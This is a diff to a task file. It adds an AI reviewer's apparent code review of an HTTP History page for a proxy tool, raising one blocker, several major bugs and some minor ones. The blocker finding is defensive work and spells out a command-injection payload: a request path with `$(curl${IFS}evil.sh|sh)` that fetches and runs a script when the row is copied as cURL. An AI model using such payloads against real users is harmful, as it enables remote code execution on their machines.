@@ -3,7 +3,7 @@ id: T-017
 title: HTTP History page with HTTPQL query bar
 milestone: M1
 role: frontend
-status: in_review
+status: changes_requested
 depends_on: [T-012, T-013]
 owner: "opencode/deepseek-v4.1-flash-1017"
 branch: task/T-017-http-history-page
@@ -122,3 +122,62 @@ HTTP History page per layout §3.1 using TrafficTable + MessageViewer, a QueryBa
 - E2E spec for the page in T-021.
 
 ## Review (reviewer)
+Reviewer: claude-code/opus-5.5 · 2026-11-18 · branch `task/T-017-http-history-page` @ 027b0e5
+
+**Scope:** all changed files are within `paths` or in the operator-approved out-of-scope list (package.json/bun.lock,
+regenerated `lib/api/generated/**`). No hand edits to generated code, no Caido assets/names found.
+**`make check`:** green (Go tests, svelte-check 0/0, eslint, prettier, 160/160 vitest). `make test-int` not needed (no Go changes).
+Findings below were reproduced with throw-away probes (a bun script against `@codemirror/state`, a temporary vitest
+file that was deleted again); nothing was committed besides this section.
+
+### Findings
+- [ ] [blocker] web/src/pages/http-history/columns.ts:152 — "Copy as cURL" pastes captured bytes into a shell command
+  unescaped. Browsers do not percent-encode `'`, `$`, `(`, `)` in paths, so a page can make the victim's browser request
+  `/x'$(curl${IFS}evil.sh|sh)'`; copying that row as cURL and pasting it runs the attacker's command. The method is also
+  unquoted (`|`, `$`, `&` are valid tchars). → POSIX-quote every interpolated value:
+  `const q = (s: string) => \`'${s.replaceAll("'", "'\\''")}'\`` and emit `curl -X ${q(row.method)} ${q(requestUrl(row))}`.
+  Add a test with a `'` and `$(…)` in the path and method.
+- [ ] [major] web/src/lib/components/QueryBar/QueryBar.svelte:67-74 — the single-line transaction filter returns
+  `changes` measured against the **new** doc (`to: tr.newDoc.length`), but a filter's returned spec applies to the
+  **start** doc. Reproduced: pasting `a\nb` into an empty bar throws `RangeError: Invalid change range 0 to 3 (in doc of
+  length 0)`; replacing `abcdef` with `x\ny` yields `"x ydef"` (garbage left behind). It also breaks Enter: while a
+  completion fetch is pending, `submit` (line 89) returns false, `defaultKeymap` inserts a newline, the filter throws and the
+  keystroke is lost — common because every keystroke starts a network completion. → build the change from the start
+  doc: `changes: { from: 0, to: tr.startState.doc.length, insert: text }`; and in `submit` only defer to the popup when
+  `completionStatus(...) === 'active'`. Add a QueryBar test that pastes multi-line text and asserts the flattened value.
+- [ ] [major] web/src/pages/http-history/history.svelte.ts:123 (+ test line 76) — `applied` is set before the server
+  accepts the query and is never rolled back on `BAD_QUERY`. Afterwards every `setSort`/`reload` re-sends the rejected
+  query: the header shows the new sort but rows keep the old order, and live rows are then `insertRow`-ed with the new
+  sort into a list ordered by the old one. The error span (lines 95-96) is also mapped against the trimmed `applied`, so a
+  query typed with leading spaces gets its squiggle shifted left. → keep the last accepted query separately: send the
+  candidate in `reload`, and only assign `applied` (and push history) on success; map the span against the text that was
+  sent and offset by the trimmed leading whitespace. Change the test to assert `applied` stays `''` after `BAD_QUERY` and
+  that a following `setSort` loads rows.
+- [ ] [major] web/src/pages/http-history/detail.ts:27-38 — the "first 4 MiB" label compares `bodyLength` (stored,
+  **encoded** size per schema `history.graphqls:127`) with the cap, but `body(limit:, decode: true)` caps the **decoded**
+  bytes. A 1.2 MiB gzipped JS bundle that inflates to 5 MiB is cut at 4 MiB with no truncation label, so a user searching
+  the response silently misses its tail. → decide from the returned bytes: truncated when the decoded body length
+  `>= MAX_BODY` (or `bodyLength > MAX_BODY` for undecoded bodies). Add a unit test for a decoded body of exactly MAX_BODY.
+- [ ] [minor] web/src/pages/http-history/HttpHistoryPage.svelte:67 — `history.start()` runs synchronously inside the
+  `$effect`, and `reload()` reads `this.applied`/`this.sort` before its first `await`, so the effect tracks them. Every
+  apply/sort re-runs the effect (tears down + restarts) and the page sends **two** `HistoryRequests` per action
+  (probe: 1 apply → 2 queries); only the token hides it. → `stop = untrack(() => history.start())`.
+- [ ] [minor] web/src/pages/http-history/history.svelte.ts:153-163 — when the selection is cleared while a detail fetch
+  is in flight (e.g. applying a filter clears the selection), `showDetail(null)` never resets `detailLoading` and the
+  superseded call returns before resetting it, so the request pane says "Loading…" until the next click. → set
+  `this.detailLoading = false` in the `!id` branch.
+- [ ] [minor] web/src/lib/components/QueryBar/QueryBar.svelte:78-112 — `historyStep`/`draft` are not reset on submit or
+  on typing. ↑ (recall), edit, Enter, then ↑ again resumes from the old index instead of the newest entry. → reset
+  `historyStep = -1` in `submit` and when the user changes the doc (not from `replaceDoc`).
+- [ ] [minor] web/src/pages/http-history/commands.ts:87 — "Filter by this host" wraps the applied query in `( … )` on a
+  single line; an applied query containing a `//` comment swallows the `) AND …` and the local check reports
+  `Missing ")"`, so the command does nothing. → before wrapping, drop a trailing `//…` comment from `applied` (or
+  rewrite it as `/* … */`); add a test with `applied = 'req.method.eq:"GET" // x'`.
+- [ ] [minor] web/src/pages/http-history/RowContextMenu.svelte (whole file) — docs/06 §1 and §5 require context menus
+  on bits-ui primitives and built from command `when` predicates; this is a hand-rolled menu (~85 lines of focus/keyboard
+  logic) that ignores `when`. → use bits-ui `ContextMenu`/`DropdownMenu` and filter items by `command.when?.(ctx)`, or
+  record the deviation explicitly as a T-022 follow-up in the task file.
+
+### Verdict
+`changes_requested` — 1 blocker, 3 major. Fix the cURL quoting, the single-line filter (+ Enter while pending), the
+`BAD_QUERY` applied-state rollback and the truncation flag, each with a regression test; minors can ride along.
